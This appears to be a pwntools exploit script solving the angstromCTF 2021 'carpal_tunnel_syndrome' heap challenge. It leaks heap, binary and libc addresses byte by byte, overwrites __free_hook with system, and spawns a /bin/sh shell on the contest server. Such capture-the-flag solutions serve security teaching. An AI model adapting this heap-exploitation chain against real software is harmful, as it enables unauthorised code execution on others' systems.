from pwn import *

e = ELF("./carpal_tunnel_syndrome")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.2021.chall.actf.co", 21840)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

def mark(x, y):
  p.sendlineafter("Choice:", "1")
  p.sendlineafter("space:", "%d %d" % (x, y))

def marker(s):
  p.sendlineafter("Choice:", "6")
  p.sendlineafter("marker:", s)

def check(idx):
  p.sendlineafter("Choice:", "4")
  p.sendlineafter(":", str(idx))
  p.sendlineafter(":", "c")
  return b"bingo" in p.recvline()

p.sendlineafter(":", "A" * 8 + "\x00")

for i in range(5):
  mark(4, i)

p.sendlineafter(":", "5")
p.sendlineafter("?", "y")
p.sendlineafter(":", str(0x100 - 8))
p.sendlineafter(":", "AAAA")


for i in range(5):
  mark(4, i)

leak = b""
for i in range(6):
  for j in range(1, 0x100):
    marker(b"A" * 8 + leak + bytes([j]) + b"\x00")
    if check(4):
      leak += bytes([j])
      print(leak)
      break

hleak = u64(leak.ljust(8, b"\x00"))

print(hex(hleak))

marker(p64(0x000055646e666630 - 0x000055646e666010 + hleak))
for i in range(5):
  mark(4, i)

p.sendlineafter(":", "5")
p.sendlineafter("?", "n")


p.sendlineafter(":", str(0x30 - 8 - 1))
p.sendlineafter(":", p64(0x000055646e666630 - 0x000055646e666010 + hleak) + b"A" * 0x10 + p64(0x561e870e42b8 - 0x561e870e4010 + hleak))

p.sendlineafter(":", "2")
p.sendlineafter(":", "4 4")
p.recvuntil("): ")

bleak = u64(p.recvline(keepends=False).ljust(8, b"\x00"))
print(hex(bleak))


p.sendlineafter(":", "5")
p.sendlineafter("?", "n")
p.sendlineafter(":", str(0x30 - 8 - 1))
p.sendlineafter(":", b"A" * 0x18 + p64(0x563096a62f70 - 0x563096a61008 + bleak))

p.sendlineafter(":", "2")
p.sendlineafter(":", "4 3")
p.recvuntil("): ")

leak = u64(p.recvline(keepends=False).ljust(8, b"\x00")) - libc.symbols["free"]
print(hex(leak))

marker(p64(leak + libc.symbols["__free_hook"]))
mark(4, 3)

marker("/bin/sh\x00")
for i in range(5):
  mark(3, i)

debug()

p.sendlineafter(":", "5")
p.sendlineafter("?", "n")
p.sendlineafter(":", str(0x30 - 8 - 1))
p.sendlineafter(":", "A")

p.sendlineafter(":", "5")
p.sendlineafter("?", "n")
p.sendlineafter(":", str(0x30 - 8 - 1))
p.sendlineafter(":", p64(leak + libc.symbols["system"]))

p.sendlineafter(":", "5")
p.sendlineafter("?", "y")

p.interactive()
